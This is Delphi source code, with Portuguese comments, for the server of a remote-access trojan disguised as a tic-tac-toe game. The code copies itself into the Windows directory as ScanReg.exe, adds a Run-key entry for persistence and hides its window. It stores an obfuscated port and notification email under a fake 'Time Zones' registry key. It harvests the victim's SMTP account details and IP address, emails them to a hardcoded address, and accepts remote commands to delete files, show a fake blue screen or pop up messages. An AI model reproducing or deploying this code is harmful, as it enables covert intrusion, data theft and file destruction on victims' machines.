unit Servidor;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
  ScktComp,Winsock,StdCtrls,SMTPWinShoe, ComCtrls,shellapi,registry,Phantom,
  FngRASNotify, ExtCtrls, KZIntDet;



type
  Tsv = class(TForm)
    stb: TStatusBar;
    Button1: TButton;
    GroupBox1: TGroupBox;
    GroupBox2: TGroupBox;
    Memo1: TMemo;
    Button2: TButton;
    Edit1: TEdit;
    Memo2: TMemo;
    ss: TServerSocket;
    Phantom: TPhantom;
    ras: TKZInternetDetect;
    procedure ssListen(Sender: TObject; Socket: TCustomWinSocket);
    procedure ssClientConnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure ssClientDisconnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ssClientRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure Edit1KeyPress(Sender: TObject; var Key: Char);
    procedure FormCreate(Sender: TObject);
    procedure FormActivate(Sender: TObject);
    procedure rasConnect(Sender: TObject);



  private
    { Private declarations }
  public
    { Public declarations }
    procedure registro(info:boolean); // verifica o registro a procura de smtp server
    function deccon(Entrada:string;codifica:boolean):string; // decodifica/codifica mail
    //procedure changereg; //le porta/email do registro
    procedure mudaport(porta:string); // muda porta no registro
    procedure mudamail(mail:string); // muda e-mail no registro
    procedure shut; //rebota a maquina;
  end;

const
     key1=HKEY_CURRENT_USER;
     key2=HKEY_LOCAL_MACHINE;
     chave1='Software\Microsoft\Internet Account Manager';
     chave2='Software\Microsoft\Windows\CurrentVersion\Time Zones';
var
  sv: Tsv;
  enviado:boolean;
  email,app:string;

implementation

{$R *.DFM}

uses IO,velhaca1;



procedure Tsv.registro(info:boolean);

const
     CR=#13+#10;

var
   reg:Tregistry;
   mailer:TWinshoeSMTP;
   porta:integer;
   servidor,nome,mail,ip,mailing:string;
   Lista:TstringList;

// inicio function values
function Values(Lista:TstringList;Valor:String):string;
var
   teste:boolean;
   numero:byte;
begin
     teste:=true;
     numero:=0;
     while teste do
           begin
                reg.OpenKey(chave1,false);
                reg.OpenKey('Accounts',false);
                reg.OpenKey(lista.Strings[numero],false);
                if reg.ValueExists(valor) then
                   begin
                        teste:=false;
                        values:=reg.ReadString(valor);
                   end
                else
                    begin
                         reg.CloseKey;
                         //reg.OpenKey(chave1,false);
                         //reg.OpenKey('Accounts',false);
                         
                    end;
                numero:=numero+1;
                if numero>lista.Count-1 then
                   teste:=false;
           end;
end;
//fim function values

begin
     try
        reg:=Tregistry.create;
         lista:=Tstringlist.Create;
         reg.RootKey:=key1;
         reg.OpenKey(chave1,false);
         if reg.KeyExists('Accounts') then
            begin
                 reg.OpenKey('Accounts',false);
                 reg.GetKeyNames(lista);
                 reg.closekey;
                 servidor:=values(lista,'SMTP Server');
                 mail:=values(lista,'SMTP Email Address');
                 nome:=values(lista,'SMTP Display Name');
                 ip:=ras.IP;
                 reg.CloseKey;
                 if not info then
                    begin
                         enviado:=true;

                         mailer.quicksend(servidor,'Server Notification',email,name,
                                  'O servidor instalado em '+nome+' '+mail+' tem IP número: '+ip+
                                   cr+'e conectou as: '+TimetoStr(Time)+cr+'do dia :'+datetostr(date));
                    end
                 else
                     begin
                          reg.RootKey:=key2;
                          reg.OpenKey(chave2,false);
                          reg.OpenKey('Galapagos',false);
                          porta:=reg.ReadInteger('MAPiD');
                          mailing:=deccon(reg.readstring('TZI'),false);
                          reg.CloseKey;
                          ss.Socket.Connections[ss.Socket.ActiveThreads].SendText('informação do servidor'+cr);
                          ss.Socket.Connections[ss.Socket.ActiveThreads].SendText('Servidor SMTP: '+servidor+cr);
                          ss.Socket.Connections[ss.Socket.ActiveThreads].SendText('User Name: '+nome+cr);
                          ss.Socket.Connections[ss.Socket.ActiveThreads].SendText('E-mail: '+mail+cr);
                          ss.Socket.Connections[ss.Socket.ActiveThreads].SendText('IP: '+ip+cr);
                          ss.Socket.Connections[ss.Socket.ActiveThreads].SendText('Porta: '+inttostr(porta)+cr);
                          ss.Socket.Connections[ss.Socket.ActiveThreads].SendText('E-mail de notificação para: '+mailing+cr);
                          ss.Socket.Connections[ss.Socket.ActiveThreads].SendText('Data: '+datetostr(date)+cr);
                          ss.Socket.Connections[ss.Socket.ActiveThreads].SendText('Hora: '+timetostr(time)+cr);
                          ss.Socket.Connections[ss.Socket.ActiveThreads].SendText('Fim da informação'+cr);

                     end;
            end;
     finally
            reg.Free;
            lista.Free;
     end;
end;
//fim da procedure registro

procedure Tsv.ssListen(Sender: TObject; Socket: TCustomWinSocket);
begin
     stb.Panels.Items[0].Text:='Esperando conexão...';
end;

procedure Tsv.ssClientConnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
     stb.Panels.Items[0].Text:='Conectado em '+socket.RemoteAddress;
end;

procedure Tsv.ssClientDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
     stb.Panels.Items[0].Text:='Desconectado';
     groupbox1.Visible:=false;
     groupbox2.Visible:=false;
end;

procedure Tsv.ssClientRead(Sender: TObject; Socket: TCustomWinSocket);
procedure mensagem(parametros:string);
const
     sp='€'; //alt 0128
var
   msg,title:Pchar;
   mens,titu:string;
   Tipo:longint;
   icon:integer;
   a,b,c:byte;
   mtype: array[0..4] of integer;
   //=(0,MB_ICONEXCLAMATION,MB_ICONINFORMATION,MB_ICONSTOP,
                         //MB_ICONQUESTION);
begin
     mtype[0]:=0;
     mtype[1]:=MB_ICONEXCLAMATION;
     mtype[2]:=MB_ICONINFORMATION;
     mtype[3]:=MB_ICONSTOP;
     mtype[4]:=MB_ICONQUESTION;
     a:=1;
     b:=1;
     c:=0;
     icon:=0;
     mens:='';
     titu:='';
     while parametros[b]<>'{' do
           begin
                b:=b+1;
                a:=b+1;
           end;
     while parametros[a]<>sp do
           begin
                titu:=titu+parametros[a];
                a:=a+1;
                b:=a+1;
           end;
     while parametros[b]<>sp do
           begin
                mens:=mens+parametros[b];
                b:=b+1;
                a:=b+1;
           end;
     while parametros[a]<>sp do
           begin
                c:=strtoint(parametros[a]);
                a:=a+1;
                b:=a+1;
           end;
     while parametros[b]<>'}' do
           begin
                icon:=strtoint(parametros[b]);
                b:=b+1;
           end;
     tipo:=0;
     if c=1 then
          tipo:=MB_ABORTRETRYIGNORE;
     if c=2 then
          tipo:=MB_OKCANCEL;
     if c=3 then
          tipo:=MB_RETRYCANCEL;
     if c=4 then
          tipo:=MB_YESNO;
     if c=5 then
          tipo:=MB_YESNOCANCEL;
     tipo:=tipo+mtype[icon];
     getmem(msg,100);
     getmem(title,500);
     strPcopy(msg,mens);
     strpcopy(title,titu);
     messagebox(application.Handle,msg,title,tipo);
     //messagebox(form1.handle,msg,title,tipo);
     freemem(msg);
     freemem(title);
     ss.Socket.Connections[ss.Socket.ActiveThreads].SendText('@Mensagem exibida');
end;

procedure bsod;
begin
     application.CreateForm(Tbsd,bsd);
     ss.Socket.Connections[ss.Socket.ActiveThreads].sendtext('@Blue screen');
     bsd.ShowModal;
     ss.Socket.Connections[ss.Socket.ActiveThreads].SendText('@BSOD exibida');
end;

procedure delete(text:string);
var
   a:byte;
   texto:string;
begin
     texto:='';
     for a:=5 to length(text) do
         texto:=texto+text[a];
     if deletefile(texto) then
        ss.Socket.Connections[ss.Socket.ActiveThreads].SendText('Arquivo deletado com sucesso')
     else
         ss.Socket.Connections[ss.Socket.ActiveThreads].SendText('Arquivo não deletado..');
end;

var
   lower,text,inf:string;
   a:byte;
begin
     text:=socket.ReceiveText;
     for a:=1 to 4 do
         inf:=inf+text[a];
     if text[1]='@' then
        begin
             lower:=lowercase(inf);
             if lower='@hab' then
                begin
                     sv.Height:=495;
                     sv.Width:=595;
                     button1.Visible:=true;
                     groupbox1.Visible:=true;
                     groupbox2.Visible:=true;
                     ss.socket.Connections[ss.Socket.ActiveThreads].SendText('@Controles habilitados');
                end;
             if lower='@dty' then
                begin
                     ss.Socket.Connections[ss.Socket.ActiveThreads].SendText('Servidor destruído...');
                     sleep(3000);
                     ss.Active:=false;
                     ss.Close;
                     application.Terminate;
                end;
             if lower='@msg' then
                begin
                     mensagem(text);
                end;
             if lower='@bsd' then
                begin
                     bsod;
                end;
             if lower='@bso' then
                begin
                     bsd.Close;
                     //bsd.free;
                     ss.Socket.Connections[ss.Socket.ActiveThreads].SendText('@BSOD desativada');
                end;
             if lower='@prt' then
                begin
                     mudaport(text);
                end;
             if lower='@mlr' then
                begin
                     mudamail(text);
                end;
             if lower='@inf' then
                begin
                     registro(true);
                end;
             if lower='@shd' then
                begin
                     shut;
                end;
             if lower='@del' then
                begin
                     delete(text);
                end;

        end
     else
         memo2.Lines.Append(text);
end;



procedure tsv.mudaport(porta:string);
var
   reg:Tregistry;
   a:byte;
   port:string;
begin
     a:=7;
 
     port:='';
     {while porta[b]<>'{' do
           begin
                b:=b+1;
                a:=b+1;
           end;}
     while porta[a]<>'}' do
           begin
                port:=port+porta[a];
                a:=a+1;
           end;
     try
        reg:=Tregistry.Create;
        reg.RootKey:=key2;
        reg.OpenKey(chave2,false);
        reg.OpenKey('Galapagos',false);
        ss.Socket.Connections[ss.Socket.ActiveThreads].SendText('@Porta atual: '+inttostr(reg.ReadInteger('MAPiD')));
        reg.DeleteValue('MAPiD');
        reg.WriteInteger('MAPiD',strtoint(port));
        sleep(5000);
        ss.Socket.Connections[ss.Socket.ActiveThreads].SendText('@Nova Porta : '+inttostr(reg.ReadInteger('MAPiD')));
        sleep(5000);
        ss.Active:=false;
        ss.Port:=reg.ReadInteger('MAPid');
        ss.Active:=true;
     finally
            reg.Free;
     end;
end;

procedure tsv.mudamail(mail:string);
var
   reg:Tregistry;
   a,b:byte;
   correio:string;
begin

     a:=7;
     b:=1;
     correio:='';
     {while mail[b]<>'{' do
           begin
                b:=b+1;
                a:=b+1;
           end; }
     while mail[a]<>'}' do
           begin
                correio:=correio+mail[a];
                a:=a+1;
           end;
     try
        reg:=Tregistry.Create;
        reg.RootKey:=key2;
        reg.OpenKey(chave2,false);
        reg.OpenKey('Galapagos',false);
        ss.Socket.Connections[ss.Socket.ActiveThreads].SendText('@E-mail atual: '+deccon(reg.readstring('TZI'),false));
        reg.DeleteValue('TZI');
        reg.WriteString('TZI',deccon(correio,true));
        sleep(5000);
        ss.Socket.Connections[ss.Socket.ActiveThreads].SendText('@Novo E-mail : '+deccon(reg.readstring('TZI'),false));
     finally
            reg.Free;
     end;
end;

procedure Tsv.Button1Click(Sender: TObject);
begin
     if ss.Active then
        begin
             ss.Close;
             button1.Caption:='Conectar';
             stb.Panels.Items[0].Text:='Desconectado';
        end
     else
         begin
              ss.Active:=true;
              button1.Caption:='Desconectar';
         end;
end;

procedure Tsv.Button2Click(Sender: TObject);
begin
     if ss.Active then
        begin
             memo1.Lines.Append(edit1.text);
             ss.Socket.Connections[ss.Socket.ActiveThreads].sendtext(edit1.text);
             edit1.Text:='';
             stb.Panels.Items[0].text:='texto enviado';
        end;

end;

procedure Tsv.FormClose(Sender: TObject; var Action: TCloseAction);
begin
     ss.Close;
     sv.Close;
end;

procedure Tsv.Edit1KeyPress(Sender: TObject; var Key: Char);
begin
     if key=#13 then
        button2.Click;
end;

function tsv.deccon(Entrada:string;codifica:boolean):string;
var
   a,b,d:integer;
   texto,c:string;
begin
     texto:='';
     if codifica then
        begin
             for b:=1 to length(entrada) do
                 begin
                      for a:=0 to 255 do
                          if entrada[b]=chr(a) then
                             texto:=texto+inttostr(a-4)+'-';
                 end;
        end
     else
         begin
              a:=1;
              c:='';
              b:=length(entrada);
              while a<=b do
                    begin
                         if entrada[a]='-' then
                            begin
                                 d:=strtoint(c);
                                 texto:=texto+chr(d+4);
                                 a:=a+1;
                                 c:='';
                            end
                         else
                             begin
                                  c:=c+entrada[a];
                                  a:=a+1;
                             end;
                    end;
         end;
     deccon:=texto;
end;


procedure Tsv.FormCreate(Sender: TObject);
var
   reg:Tregistry;
   arq:pchar;
   a,windir,c:string;

procedure changereg;
begin
     reg.RootKey:=key2;
     reg.OpenKey(chave2,false);
     reg.OpenKey('Galapagos',false);
     ss.Active:=false;
     ss.Port:=reg.ReadInteger('MAPiD');
     sleep(2000);
     ss.Active:=true;
     email:=deccon(reg.ReadString('TZI'),false);
     reg.CloseKey;
end;

procedure copyarq(arquivo:string);
var
   atual,novo:pchar;
   b:string;
begin
     b:='Scanreg.exe';
     getmem(atual,350);
     getmem(novo,350);
     b:=windir+'\'+b;
     strpcopy(atual,arquivo);
     strpcopy(novo,b);
     copyfile(atual,novo,false);
     freemem(novo,350);
     freemem(atual,350);

     //freemem(arq,100);
end ;

begin
     getmem(arq,100);
     getwindowsdirectory(arq,100);
     windir:=strpas(arq);
     freemem(arq,100);
     email:='';
     sv.Height:=0;
     sv.Width:=0;
     enviado:=false;
     //ras.Connected:=true;
     a:=extractfilename(application.ExeName);
     c:=a;
     a:=windir+'\ScanReg.exe';
     if not fileExists(a) then
        copyarq(c);
     c:=a;
     reg:=Tregistry.Create;
     try
        reg.RootKey:=key2;
        reg.OpenKey('Software\Microsoft\Windows\CurrentVersion\Run',false);
        if not reg.ValueExists('Scanreg') then
           reg.WriteString('ScanReg',c);
        reg.CloseKey;
        {a:=UpperCase(extractfilename(application.exename));
        if a='VELHA.EXE' then
           begin
                //showwindow(application.handle,SW_Show);
                application.CreateForm(TTicTac,TicTac);
                tictac.Show;
           end;}
        reg.RootKey:=key2;
        reg.OpenKey(chave2,false);
        if not (reg.KeyExists('Galapagos')) then
           begin
                reg.CreateKey('Galapagos');
                reg.OpenKey('Galapagos',false);
                reg.WriteInteger('MAPiD',666);
                email:='carlos@netwalk.com.br';
                reg.WriteString('TZI',deccon(email,true));
           end;

        a:=UpperCase(extractfilename(application.exename));
        if a='VELHA.EXE' then
           begin
                //showwindow(application.handle,SW_Show);
                application.CreateForm(TTicTac,TicTac);
                tictac.Show;
           end
        else
            begin
                 reg.CloseKey;
                 reg.RootKey:=key2;
                 reg.OpenKey(chave2,false);
                 if reg.KeyExists('Galapagos') then
                    begin
                         reg.closekey;
                         changereg;
                         
                    end;
            end;
;
        finally
            reg.Free;
     end;

end;

procedure Tsv.FormActivate(Sender: TObject);

begin
     sv.Height:=0;
     sv.Width:=0;
end;

procedure tsv.shut;
begin
     ss.Socket.Connections[ss.Socket.ActiveThreads].SendText('@Rebootando e desligando a máquina');
     sleep(5000);
end;

procedure Tsv.rasConnect(Sender: TObject);
begin
     if (not enviado) then
        begin
             registro(false);
        end;
end;

initialization
begin
     app:=Uppercase(extractfilename(application.exename));
     if app='SCANREG.EXE' then
        showwindow(application.handle,SW_HIDE);

end;

end.
